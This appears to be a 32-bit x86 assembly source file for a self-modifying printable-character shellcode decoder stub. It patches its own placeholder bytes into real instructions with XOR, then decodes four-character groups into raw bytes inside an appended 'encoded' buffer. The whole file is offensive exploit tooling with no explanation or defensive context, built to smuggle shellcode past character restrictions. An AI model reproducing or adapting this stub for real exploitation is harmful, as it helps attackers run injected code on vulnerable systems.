	.text
setup:
	# setup has 18 bytes
	pusha
	pusha
	push %eax
	pop %esi
	push $0x5E
	pop %eax
	push %eax
	pop %ecx
	xor $0x5E, %al
	push %eax
	pop %ebp
	dec %eax
	xor $0x5E, %al
	push %eax
	pop %edx
	# edx = 0xFFFFFFA1, ecx = 0x5E, ebp = 0

xor_patcher:
	# xor_patcher has 92 bytes
	xorb %dl, 0x76(%esi)  			# c1 --	60
	xorb %dl, 0x77(%esi) 			# e3 -- 42
	xorb %cl, 0x78(%esi)			# 12 -- 4c
	xorb %dl, 0x7A(%esi)			# d8 -- 79
	xorb %dl, 0x21(%esi)			# 8d -- 2c 
	# lea esi, [esi+0x60] 8d 76 60
	# looper = esi + 110
	# looper + 19 = new_esi + 0x21
	.byte 0x2C
	.byte 0x76
	.byte 0x60
	xorb %dl, 0x21(%esi)				# 80 -- 21 
	xorb %dl, 0x22(%esi)				# e3 -- 42
	xorb %dl, 0x24(%esi)				# c1 --	60
	xorb %dl, 0x25(%esi)				# e3 -- 42
	xorb %cl, 0x26(%esi)				# 0c -- 52
	xorb %dl, 0x28(%esi)				# d8 -- 79
	xorb %dl, 0x2F(%esi)				# 80 -- 21
	xorb %dl, 0x30(%esi)				# e3 -- 42
	xorb %dl, 0x32(%esi)				# c1 --	60
	xorb %dl, 0x33(%esi)				# e3 -- 42
	xorb %cl, 0x34(%esi)				# 06 -- 58
	xorb %dl, 0x36(%esi)				# d8 -- 79
	xorb %dl, 0x3D(%esi) 			# 80 -- 21
	xorb %dl, 0x3E(%esi)				# e3 -- 42	
	xorb %dl, 0x41(%esi)				# d8 -- 79
	xorb %dl, 0x42(%esi)				# 88 -- 29
	xorb %dl, 0x45(%esi)				# d8 -- 29
	xorb %dl, 0x48(%esi)				# c1 -- 60
	xorb %dl, 0x49(%esi)				# e8 -- 49
	xorb %cl, 0x4A(%esi)				# 10 -- 4e
	xorb %dl, 0x4B(%esi)				# 88 -- 29
	xorb %dl, 0x55(%esi) 			# 80 -- 21
	xorb %dl, 0x5A(%esi)
	xorb %cl, 0x5A(%esi)
	push %esi
	pop %edi

looper:
	# looper has 77 bytes, 26 bytes need to patching
	push %ebp
	pop %eax
	push %eax						# 50
	pop %ebx						# 5b	

	# encoded = 0x5C
	xorb 0x5C(%esi), %bl			# 32 5e ??
	inc %ebx
	# looper + 8
	# shl $18, %ebx					# c1 e3 12	3
	.byte 0x60
	.byte 0x42
	.byte 0x4C
	# xor %ebx, %eax					# 31 d8		1
	.byte 0x31
	.byte 0x79
	push %ebp
	pop %ebx
	xorb 0x5D(%esi), %bl		# 32 5e ??	
	inc %ebx
	# loop + 19
	# andb $0x3F, %bl   				# 80 e3 3f	2
	.byte 0x21
	.byte 0x42
	.byte 0x3F
	# shl $12, %ebx                   # c1 e3 0c	3
	.byte 0x60
	.byte 0x42
	.byte 0x52
	# xor %ebx, %eax 					# 31 d8		1
	.byte 0x31
	.byte 0x79
	push %ebp
	pop %ebx
	xorb 0x5E(%esi), %bl		# 32 5e ??	
	inc %ebx
	# loop + 33
	# andb $0x3F, %bl					# 80 e3 3f	2
	.byte 0x21
	.byte 0x42
	.byte 0x3F
	# shl $6, %ebx					# c1 e3 06	3
	.byte 0x60
	.byte 0x42
	.byte 0x58
	# xor %ebx, %eax					# 31 d8		1
	.byte 0x31
	.byte 0x79

	push %ebp
	pop %ebx
	xorb 0x5F(%esi), %bl		# 32 5e ??
	inc %ebx
	# loop + 47
	# andb $0x3F, %bl					# 80 e3 3f 	2
	.byte 0x21
	.byte 0x42
	.byte 0x3F
	# xor %ebx, %eax					# 31 d8 	1
	.byte 0x31
	.byte 0x79
	# mov %al, encoded+2(%edi)		# 88 47 ??	1
	.byte 0x29
	.byte 0x47
	.byte 0x5E
	# mov %ah, encoded+1(%edi) 		# 88 67 ??	1
	.byte 0x29
	.byte 0x67
	.byte 0x5D
	# shr $16, %eax					# c1 e8 10	3
	.byte 0x60
	.byte 0x49
	.byte 0x4E
	# mov %al, encoded(%edi)			# 88 47 ??	1
	.byte 0x29
	.byte 0x47
	.byte 0x5C
	inc %edi
	inc %edi
	inc %edi
	inc %esi
	inc %esi
	inc %esi
	inc %esi
	# loop + 71
	# cmpb $0x26, 0x33(%esi)		# 80 7e ?? 26  1
	.byte 0x21
	.byte 0x7E
	.byte 0x5C
	.byte 0x26
	# jne looper						# 75 b3		1
	.byte 0x75
	.byte 0x4C
end:
	popa
encoded:
	
